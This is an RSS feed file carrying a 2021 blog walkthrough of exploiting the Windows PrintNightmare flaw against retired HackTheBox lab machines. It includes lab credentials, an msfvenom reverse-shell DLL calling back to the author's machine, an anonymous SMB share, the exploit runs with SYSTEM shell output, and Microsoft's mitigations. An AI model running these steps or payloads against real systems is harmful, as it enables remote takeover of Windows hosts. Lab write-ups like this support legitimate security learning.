@@ -1,0 +1,308 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>PrintNightmare on Ef&#39;s log</title>
+    <link>https://fahmifj.github.io/tags/printnightmare/</link>
+    <description>Recent content in PrintNightmare on Ef&#39;s log</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Sat, 17 Jul 2021 13:52:01 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/printnightmare/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Play with PrintNightmare using HackTheBox machines</title>
+      <link>https://fahmifj.github.io/blog/play-with-printnightmare-using-hackthebox-machines/</link>
+      <pubDate>Sat, 17 Jul 2021 13:52:01 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/blog/play-with-printnightmare-using-hackthebox-machines/</guid>
+      <description>In the past week, a lot of InfoSec pros I follow in Twitter were tweeting about a remote code execution vulnerability in the Windows Print Spooler service that could be used for privilege escalation, and it affects all the Windows versions. Microsoft has assigned CVE-2021-34527 to this vulnerability, which is now publicly known as PrintNightmare. This vulnerability was accidentally disclosed by Chinese security researchers after Microsoft released a security patch on June 8, 2021 for CVE-2021-1675, which is also a remote code execution in the Windows Print Spooler service.</description>
+      <content:encoded><![CDATA[<p>In the past week, a lot of InfoSec pros I follow in Twitter were <em>tweeting</em> about a remote code execution vulnerability in the Windows Print Spooler service that could be used for privilege escalation, and it affects all the Windows versions. Microsoft has assigned CVE-2021-34527 to this vulnerability, which is now publicly known as PrintNightmare. This vulnerability was accidentally disclosed by Chinese security researchers after Microsoft released a security patch on June 8, 2021 for CVE-2021-1675, which is also a remote code execution in the Windows Print Spooler service. The researchers thought their finding were CVE-2021-1675, but it turned out to be different.</p>
+<p>In this post, I would like to play with the vulnerability using HackTheBox retired machines as targets.</p>
+<h2 id="target-machines">Target Machines</h2>
+<p>The following are the retired Windows machines from HackTheBox along with a low privilege user that I will use to play with PrintNightmare.</p>
+<center>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">Target</th>
+<th style="text-align:center">IP</th>
+<th style="text-align:center">Low Priv Credentials [username:password]</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">Active</td>
+<td style="text-align:center">10.10.10.100</td>
+<td style="text-align:center">svc_tgs:GPPstillStandingStrong2k18</td>
+</tr>
+<tr>
+<td style="text-align:center">Bastion</td>
+<td style="text-align:center">10.10.10.134</td>
+<td style="text-align:center">l4mpje:bureaulampje</td>
+</tr>
+<tr>
+<td style="text-align:center">Heist</td>
+<td style="text-align:center">10.10.10.149</td>
+<td style="text-align:center">hazard:stealth1agent</td>
+</tr>
+<tr>
+<td style="text-align:center">Forest</td>
+<td style="text-align:center">10.10.10.161</td>
+<td style="text-align:center">svc-alfresco:s3rvice</td>
+</tr>
+<tr>
+<td style="text-align:center">Atom</td>
+<td style="text-align:center">10.10.10.237</td>
+<td style="text-align:center">jason:kidvscat_electron_@123</td>
+</tr>
+</tbody>
+</table>
+</center>
+<h2 id="printnightmare-cve-2021-1675">PrintNightmare (CVE-2021-1675)</h2>
+<p>There are several exploit PoC for PrintNightmare, but I will use the one that created by <a href="https://www.hackthebox.eu/profile/9164">Cube0x0</a>.</p>
+<h3 id="working-directory-preparation">Working Directory Preparation</h3>
+<p>To work with the exploit, I&rsquo;ll have to change my impacket version to the one that has been modified by Cube0x0. This could potentially mess my Kali Linux system. Therefore, I&rsquo;ll just setup a virtual environment using Python  <code>venv</code> module.</p>
+<p>First, I&rsquo;ll create a new folder called <code>printnightmare</code> in <code>/opt/</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «opt» «10.10.14.75» 
+$ mkdir printnightmare <span style="color:#f92672">&amp;&amp;</span> cd printnightmare
+</code></pre></div><p>I&rsquo;ll clone the exploit PoC as well as the modified impacket inside <code>printnightmare</code> folder. I&rsquo;ll rename the PoC to <code>CVE-2021-1675-cube0x0</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
+$ git clone https://github.com/cube0x0/CVE-2021-1675.git <span style="color:#f92672">&amp;&amp;</span> git clone https://github.com/cube0x0/impacket
+→ kali@kali «printnightmare» «10.10.14.75» 
+$ mv CVE-2021-1675 CVE-2021-1675-cube0x0
+</code></pre></div><p>I&rsquo;ll create a virtual environment using <code>virtualenv</code> called <code>impacket-venv</code>. If you don&rsquo;t have one, install with <code>python3 -m pip install virtualenv </code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
+$ virtualenv impacket-venv
+created virtual environment CPython3.9.2.final.0-64 in 614ms
+  creator CPython3Posix<span style="color:#f92672">(</span>dest<span style="color:#f92672">=</span>/opt/printnightmare/impacket-venv, clear<span style="color:#f92672">=</span>False, no_vcs_ignore<span style="color:#f92672">=</span>False, global<span style="color:#f92672">=</span>False<span style="color:#f92672">)</span>
+  seeder FromAppData<span style="color:#f92672">(</span>download<span style="color:#f92672">=</span>False, pip<span style="color:#f92672">=</span>bundle, setuptools<span style="color:#f92672">=</span>bundle, wheel<span style="color:#f92672">=</span>bundle, via<span style="color:#f92672">=</span>copy, app_data_dir<span style="color:#f92672">=</span>/home/kali/.local/share/virtualenv<span style="color:#f92672">)</span>
+    added seed packages: pip<span style="color:#f92672">==</span>21.1.3, setuptools<span style="color:#f92672">==</span>57.1.0, wheel<span style="color:#f92672">==</span>0.36.2
+  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator,XonshActivator
+</code></pre></div><p>I&rsquo;ll activate the virtual environment and install the cube0x0 impacket.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
+$ source impacket-venv/bin/activate <span style="color:#f92672">&amp;&amp;</span> cd impacket
+<span style="color:#f92672">(</span>impacket-venv<span style="color:#f92672">)</span> → kali@kali «impacket» «10.10.14.75» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> 
+$ python3 setup.py install
+running install
+running bdist_egg
+running egg_info
+...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+</code></pre></div><h3 id="generate-malicious-dll">Generate Malicious DLL</h3>
+<p>To exploit this, I&rsquo;ll also need a DLL, and it will be loaded by the exploit.</p>
+<p>I could generate the DLL with help of <code>msfvenom</code> . Upon a successful exploitation, this DLL will connects back to my attacking machine on port 4444.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">(</span>impacket-venv<span style="color:#f92672">)</span> → kali@kali «printnightmare» «10.10.14.75» 
+$ mkdir dll
+<span style="color:#f92672">(</span>impacket-venv<span style="color:#f92672">)</span> → kali@kali «dll» «10.10.14.75» 
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.75 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f dll &gt; revshell.dll  
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: <span style="color:#ae81ff">460</span> bytes
+Final size of dll file: <span style="color:#ae81ff">8704</span> bytes
+</code></pre></div><p>The DLL generated under <code>/opt/printnightmare/dll/[here]</code>.</p>
+<h3 id="host-dll-using-smb">Host DLL Using SMB</h3>
+<p>The DLL will be hosted using Samba/SMB share and it  must be configured to allow anonymous access. Fortunately, cube0x0 provides an instruction in the exploit repo on how to configure that.</p>
+<p>Before doing any modification, I&rsquo;ll create a backup of the configuration original file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">(</span>impacket-venv<span style="color:#f92672">)</span> → kali@kali «printnightmare» «10.10.14.75» 
+$ sudo cp /etc/samba/smb.conf<span style="color:#f92672">{</span>,.bak<span style="color:#f92672">}</span>
+</code></pre></div><p>In my case, I&rsquo;ll use the following configuration to add a new share named <code>ef</code> .</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[ef]
+    comment = Samba
+    path = /opt/printnightmare/dll/
+    guest ok = yes
+    read only = no
+    browsable = yes
+</code></pre></div><p>Lastly, I&rsquo;ll start the Samba daemon.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">(</span>impacket-venv<span style="color:#f92672">)</span> → kali@kali «printnightmare» «10.10.14.75» 
+$ sudo systemctl start smbd 
+</code></pre></div><h3 id="target-scanning">Target Scanning</h3>
+<p>According to <a href="https://www.splunk.com/en_us/blog/security/i-pity-the-spool-detecting-printnightmare-cve-2021-34527.html">this blog post</a> by Splunk Threat Researcher Team, there are three prerequisites for successful exploitation of PrintNightmare:</p>
+<ol>
+<li>Print Spooler Service enabled on the target system ❔</li>
+<li>Network connectivity to the target system (initial access has been obtained)  ✔</li>
+<li>Hash or password for a low privileged user (or computer) account  ✔</li>
+</ol>
+<p>Now to check if the Print Spooler service enabled, I could follow cube0x0&rsquo;s instruction using a tool from impacket called <code>rpcdump.py</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ rpcdump.py @<span style="color:#f92672">[</span>IP-ADDRESS<span style="color:#f92672">]</span> | egrep <span style="color:#e6db74">&#39;MS-RPRN|MS-PAR&#39;</span>
+</code></pre></div><p><code>rpcclient</code> can also be used to detect the Print Spooler service by invoking <code>enumprinters</code> command. The command will returns the available printers, but if it returns &ldquo;Could not initialise spoolss&rdquo;, then the Print Spooler is most likely to be disabled.</p>
+<p>I&rsquo;ve created a dirty bash script to do these detection.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/sh
+</span><span style="color:#75715e"></span>
+targets<span style="color:#f92672">=</span>$1
+
+<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -z <span style="color:#e6db74">&#34;</span>$targets<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+  echo <span style="color:#e6db74">&#34;[-] Usage\t: </span>$0<span style="color:#e6db74"> [Target file]&#34;</span> 
+  echo <span style="color:#e6db74">&#34;[-] File format : &lt;ip&gt;:&lt;username&gt;:&lt;password&gt; | 127.0.0.1:foo:bar&#34;</span>
+  <span style="color:#66d9ef">else</span>
+	<span style="color:#66d9ef">for</span> target in <span style="color:#e6db74">`</span>cat $targets<span style="color:#e6db74">`</span>; <span style="color:#66d9ef">do</span>
+		 ip<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo $target | cut -d <span style="color:#e6db74">&#39;:&#39;</span> -f1<span style="color:#66d9ef">)</span>
+		 username<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo $target | cut -d <span style="color:#e6db74">&#39;:&#39;</span> -f2<span style="color:#66d9ef">)</span>
+		 password<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo $target | cut -d <span style="color:#e6db74">&#39;:&#39;</span> -f3<span style="color:#66d9ef">)</span>
+		 echo  <span style="color:#e6db74">&#34; - [</span>$ip<span style="color:#e6db74">] - &#34;</span> 
+		 impacket-rpcdump $ip | egrep <span style="color:#e6db74">&#39;MS-RPRN|MS-PAR&#39;</span>
+		 rpcclient -U <span style="color:#e6db74">&#34;</span>$username<span style="color:#e6db74">%</span>$password<span style="color:#e6db74">&#34;</span> $ip -c <span style="color:#e6db74">&#34;enumprinters;quit&#34;</span>
+	<span style="color:#66d9ef">done</span>
+<span style="color:#66d9ef">fi</span>
+</code></pre></div><p>It outputs the following results.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">(</span>impacket-venv<span style="color:#f92672">)</span> → kali@kali «printnightmare» «10.10.14.75» 
+$ ./detect-nightmare.sh target-machines                 
+ - <span style="color:#f92672">[</span>10.10.10.100<span style="color:#f92672">]</span> - 
+Protocol: <span style="color:#f92672">[</span>MS-RPRN<span style="color:#f92672">]</span>: Print System Remote Protocol 
+Could not initialise spoolss. Error was NT_STATUS_OBJECT_NAME_NOT_FOUND
+ - <span style="color:#f92672">[</span>10.10.10.134<span style="color:#f92672">]</span> - 
+Protocol: <span style="color:#f92672">[</span>MS-PAR<span style="color:#f92672">]</span>: Print System Asynchronous Remote Protocol 
+Protocol: <span style="color:#f92672">[</span>MS-RPRN<span style="color:#f92672">]</span>: Print System Remote Protocol 
+No printers returned.
+ - <span style="color:#f92672">[</span>10.10.10.149<span style="color:#f92672">]</span> - 
+Protocol: <span style="color:#f92672">[</span>MS-PAR<span style="color:#f92672">]</span>: Print System Asynchronous Remote Protocol 
+Protocol: <span style="color:#f92672">[</span>MS-RPRN<span style="color:#f92672">]</span>: Print System Remote Protocol 
+No printers returned.
+ - <span style="color:#f92672">[</span>10.10.10.161<span style="color:#f92672">]</span> - 
+Cannot connect to server.  Error was NT_STATUS_HOST_UNREACHABLE
+ - <span style="color:#f92672">[</span>10.10.10.237<span style="color:#f92672">]</span> - 
+Protocol: <span style="color:#f92672">[</span>MS-PAR<span style="color:#f92672">]</span>: Print System Asynchronous Remote Protocol 
+Protocol: <span style="color:#f92672">[</span>MS-RPRN<span style="color:#f92672">]</span>: Print System Remote Protocol 
+result was WERR_INVALID_NAME
+</code></pre></div><p>Because HackTheBox - Active is likely not vulnerable, I will skip it from exploitation demo. I will also skip Forest, because it seems someone messed up with the machine. But, I&rsquo;ll add Forest to this post if it&rsquo;s up.</p>
+<h3 id="exploitation-demo">Exploitation Demo</h3>
+<h4 id="htb-bastion---101010134">HTB: Bastion - 10.10.10.134</h4>
+<p>I ran the exploit against Bastion, but the DLL got removed by AV 😂.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">(</span>impacket-venv<span style="color:#f92672">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span style="color:#f92672">(</span>main<span style="color:#f92672">)</span> 
+$ python3 CVE-2021-1675.py Bastion/l4mpje:<span style="color:#e6db74">&#39;bureaulampje&#39;</span>@10.10.10.134 <span style="color:#e6db74">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting to ncacn_np:10.10.10.134<span style="color:#f92672">[</span><span style="color:#ae81ff">\P</span>IPE<span style="color:#ae81ff">\s</span>poolss<span style="color:#f92672">]</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Bind OK
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> pDriverPath Found C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\D</span>riverStore<span style="color:#ae81ff">\F</span>ileRepository<span style="color:#ae81ff">\n</span>tprint.inf_amd64_1734185bdb8f8610<span style="color:#ae81ff">\A</span>md64<span style="color:#ae81ff">\U</span>NIDRV.DLL
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing <span style="color:#ae81ff">\?</span>?<span style="color:#ae81ff">\U</span>NC<span style="color:#ae81ff">\1</span>0.10.14.75<span style="color:#ae81ff">\e</span>f<span style="color:#ae81ff">\r</span>evshell.dll
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try 1...
+Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
+...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+impacket.dcerpc.v5.rprn.DCERPCSessionError: RPRN SessionError: code: 0xe1 - ERROR_VIRUS_INFECTED - Operation did not complete successfully because the file contains a virus or potentially unwanted software
+</code></pre></div><p>Unfortunately, I don&rsquo;t have Visual Studio to build an innocent DLL for reverse shell template, but the conclusion here Bastion was vulnerable.</p>
+<h4 id="htb-heist---101010149">HTB: Heist - 10.10.10.149</h4>
+<p>On Heist, the exploitation doesn&rsquo;t show any indication of successful exploitation.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">(</span>impacket-venv<span style="color:#f92672">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span style="color:#f92672">(</span>main<span style="color:#f92672">)</span> 
+$ python3 CVE-2021-1675.py heist/hazard:<span style="color:#e6db74">&#39;stealth1agent&#39;</span>@10.10.10.149 <span style="color:#e6db74">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting to ncacn_np:10.10.10.149<span style="color:#f92672">[</span><span style="color:#ae81ff">\P</span>IPE<span style="color:#ae81ff">\s</span>poolss<span style="color:#f92672">]</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Bind OK
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> pDriverPath Found C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\D</span>riverStore<span style="color:#ae81ff">\F</span>ileRepository<span style="color:#ae81ff">\n</span>tprint.inf_amd64_83aa9aebf5dffc96<span style="color:#ae81ff">\A</span>md64<span style="color:#ae81ff">\U</span>NIDRV.DLL
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing <span style="color:#ae81ff">\?</span>?<span style="color:#ae81ff">\U</span>NC<span style="color:#ae81ff">\1</span>0.10.14.75<span style="color:#ae81ff">\e</span>f<span style="color:#ae81ff">\r</span>evshell.dll
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try 1...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Stage0: <span style="color:#ae81ff">0</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try 2...
+Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
+...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING<span style="color:#f92672">(</span>The specified named pipe is in the closing state.<span style="color:#f92672">)</span>
+</code></pre></div><p>But strangely, I got a shell in my listener.</p>
+<pre><code>→ kali@kali «printnightmare» «10.10.14.75» 
+$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.75] from (UNKNOWN) [10.10.10.149] 49700
+Microsoft Windows [Version 10.0.17763.437]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+
+C:\Windows\system32&gt;hostname
+hostname
+SupportDesk
+
+C:\Windows\system32&gt;ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : 
+   IPv6 Address. . . . . . . . . . . : dead:beef::c138:bcba:454d:8b9c
+   Link-local IPv6 Address . . . . . : fe80::c138:bcba:454d:8b9c%15
+   IPv4 Address. . . . . . . . . . . : 10.10.10.149
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
+                                       10.10.10.2
+</code></pre><p><img class="img-container" src="imgs/image-20210717130728398.png" alt="image-20210717130728398"  />
+</p>
+<h4 id="htb-atom---101010161">HTB: Atom - 10.10.10.161</h4>
+<p>On Atom, the exploit also returns error.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">(</span>impacket-venv<span style="color:#f92672">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span style="color:#f92672">(</span>main<span style="color:#f92672">)</span> 
+$ python3 CVE-2021-1675.py ATOM/jason:<span style="color:#e6db74">&#39;kidvscat_electron_@123&#39;</span>@10.10.10.237 <span style="color:#e6db74">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting to ncacn_np:10.10.10.237<span style="color:#f92672">[</span><span style="color:#ae81ff">\P</span>IPE<span style="color:#ae81ff">\s</span>poolss<span style="color:#f92672">]</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Bind OK
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> pDriverPath Found C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\D</span>riverStore<span style="color:#ae81ff">\F</span>ileRepository<span style="color:#ae81ff">\n</span>tprint.inf_amd64_c62e9f8067f98247<span style="color:#ae81ff">\A</span>md64<span style="color:#ae81ff">\U</span>NIDRV.DLL
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing <span style="color:#ae81ff">\?</span>?<span style="color:#ae81ff">\U</span>NC<span style="color:#ae81ff">\1</span>0.10.14.75<span style="color:#ae81ff">\e</span>f<span style="color:#ae81ff">\r</span>evshell.dll
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try 1...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Stage0: <span style="color:#ae81ff">0</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try 2...
+Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
+...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+impacket.smbconnection.SessionError: SMB SessionError: STATUS_PIPE_CLOSING<span style="color:#f92672">(</span>The specified named pipe is in the closing state.<span style="color:#f92672">)</span>
+</code></pre></div><p>But then the DLL connected to my listener.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
+$ nc -nvlp <span style="color:#ae81ff">4444</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.75<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.237<span style="color:#f92672">]</span> <span style="color:#ae81ff">62322</span>
+Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.19042.906<span style="color:#f92672">]</span>
+<span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> Microsoft Corporation. All rights reserved.
+
+C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
+whoami
+nt authority<span style="color:#ae81ff">\s</span>ystem
+
+C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\s</span>ystem32&gt;hostname
+hostname
+ATOM
+
+C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\s</span>ystem32&gt;ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv6 Address. . . . . . . . . . . : dead:beef::6036:234d:b46e:b7d
+   Temporary IPv6 Address. . . . . . : dead:beef::6193:2da2:279d:6fea
+   Temporary IPv6 Address. . . . . . : dead:beef::94cf:8412:6dc6:a8ed
+   Link-local IPv6 Address . . . . . : fe80::6036:234d:b46e:b7d%6
+   IPv4 Address. . . . . . . . . . . : 10.10.10.237
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
+                                       10.10.10.2
+</code></pre></div><p><img class="img-container" src="imgs/image-20210717125927762.png" alt="image-20210717125927762"  />
+</p>
+<p>I have no clue why the error happened 😅. If I find out the problem, I&rsquo;ll update this post.</p>
+<h3 id="mitigation">Mitigation</h3>
+<p>Microsoft provided <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">two options</a> as workarounds to mitigate PrintNightmare: Disable Print Spooler service and Disable inbound remote printing through Group Policy. Also it is recommended to install <a href="https://support.microsoft.com/topic/31b91c02-05bc-4ada-a7ea-183b129578a7">KB5005010</a> patch.</p>
+<p>As for the second option, I have no idea to work with that from CLI, so I&rsquo;ll just try the first option.</p>
+<h4 id="disable-print-spooler-service">Disable Print Spooler Service</h4>
+<p>Determine if the Print Spooler Service is running by using  <code>Get-Service -Name Spooler</code> in PowerShell. If the service is running, stop and disable it using the following commands (run these consecutively).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Stop-Service -Name Spooler -Force
+Set-Service -Name Spooler -StartupType Disabled
+</code></pre></div><p>I&rsquo;ll apply these on Bastion</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">*Evil-WinRM* PS C:\&gt; Get-Service -Name Spooler 
+
+Status   Name               DisplayName
+------   ----               -----------
+Running  Spooler            Print Spooler
+
+
+*Evil-WinRM* PS C:\&gt; Stop-Service -Name Spooler -Force
+*Evil-WinRM* PS C:\&gt; Set-Service -Name Spooler -StartupType Disabled
+</code></pre></div><p>It mitigates the attacks.</p>
+<p><img class="img-container" src="imgs/image-20210717133929589.png" alt="image-20210717133929589"  />
+</p>
+<hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527</a></li>
+<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675</a></li>
+<li><a href="https://unit42.paloaltonetworks.com/cve-2021-34527-printnightmare/">https://unit42.paloaltonetworks.com/cve-2021-34527-printnightmare/</a></li>
+<li><a href="https://www.bitsight.com/blog/zerologon-bitsight-observations-on-a-dangerous-vulnerability">https://www.bitsight.com/blog/zerologon-bitsight-observations-on-a-dangerous-vulnerability</a></li>
+<li><a href="https://unix.stackexchange.com/questions/583374/i-am-having-a-hard-time-installing-impacket-into-kali-linux-can-some-one-point">https://unix.stackexchange.com/questions/583374/i-am-having-a-hard-time-installing-impacket-into-kali-linux-can-some-one-point</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+  </channel>
+</rss>
